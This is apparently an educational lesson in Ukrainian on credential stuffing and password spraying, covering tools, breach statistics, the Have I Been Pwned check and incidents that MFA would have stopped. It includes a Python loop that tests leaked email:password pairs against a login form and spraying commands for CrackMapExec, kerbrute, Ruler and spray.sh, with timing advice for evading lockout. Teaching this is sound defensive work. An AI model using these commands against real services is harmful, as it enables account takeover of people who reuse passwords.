Credential Stuffing

Credential Stuffing — автоматичне використання пар email:password з витоків даних для входу в інші сервіси. 65% людей повторно використовують паролі.

Як працює

  1. Отримати базу витоку (email:password)
  2. Автоматизувати логін на цільовому сайті
  3. Валідні пари = скомпрометовані акаунти
  • Успішність: 0.1–2% (але при мільйонах пар = тисячі акаунтів)
  • Статистика: 193 мільярди спроб credential stuffing у 2024 (Akamai)

Інструменти

  • SentryMBA — GUI credential stuffer (used by criminals)
  • OpenBullet — модульний checker
  • Snipr — автоматизований стаффер
  • Custom scripts — Python + requests/selenium
# Python приклад (етичне тестування)
import requests
for cred in open('leaked.txt'):
    user, pwd = cred.strip().split(':')
    r = requests.post(url,
        data={'user': user, 'pass': pwd})
    if 'Welcome' in r.text:
        print(f'Valid: {user}:{pwd}')

Password Spraying

Password Spraying — один пароль перевіряється проти багатьох облікових записів. Обходить блокування акаунтів (lockout policies).

Стратегія

  • Зворотній підхід: замість "багато паролів → 1 акаунт" → "1 пароль → багато акаунтів"
  • Типові паролі: Season+Year (Spring2025!, Winter2024), Company+123, Welcome1, Password1!
  • Пауза між спробами: 30–60 хвилин (обхід lockout)
  • Ідеально для: Active Directory

Інструменти AD

# CrackMapExec / NetExec (AD)
crackmapexec smb dc.target.com \
  -u users.txt -p 'Spring2025!' \
  --continue-on-success

# Spray (Greenwolf)
spray.sh -smb dc.target.com \
  users.txt passwords.txt 1 60

# Ruler (Exchange/O365)
ruler -domain target.com brute \
  --users users.txt \
  --passwords passwords.txt

# kerbrute (Kerberos pre-auth)
kerbrute passwordspray \
  --dc dc.target.com -d target.com \
  users.txt 'Winter2024!'

Витоки даних та масштаб проблеми

Масштаб витоків

  • Collection #1–5 (2019): 2.2 мільярда email:password
  • RockYou2024: 10 мільярдів паролів
  • LinkedIn (2012/2021): 700M профілів
  • Facebook (2021): 533M
  • Yahoo (2013–2014): 3 мільярди акаунтів

Have I Been Pwned (HIBP)

  • Troy Hunt's проект
  • 13+ мільярдів скомпрометованих акаунтів
  • 800+ витоків у базі
  • API для перевірки паролів (k-anonymity)
  • Інтегровано в: Firefox Monitor, 1Password

Перевірка та захист

# Перевірка через API (k-anonymity)
# SHA1 пароля → перші 5 символів
echo -n "password" | sha1sum
# 5BAA6... → запит до API
curl https://api.pwnedpasswords.com/\
  range/5BAA6
# Відповідь: решта хешу:кількість

Реальні інциденти та уроки

Colonial Pipeline (2021)

  • Одна скомпрометована VPN-обліковка
  • Пароль з витоку (без MFA)
  • Наслідки: 5 днів без палива, $4.4M викуп
  • Урок: MFA + моніторинг витоків

Okta (2024)

  • Credential stuffing через проксі
  • Компрометація клієнтських тенантів
  • Анонімізація через residential proxies
  • Урок: rate limiting + CAPTCHA + IP reputation

Microsoft (2024)

  • Password spraying від Midnight Blizzard (APT29)
  • Один тестовий акаунт без MFA
  • Доступ до email топ-менеджерів
  • Урок: MFA для ВСІХ акаунтів, включаючи тестові
Кожен з цих інцидентів міг бути попереджений простим увімкненням MFA!
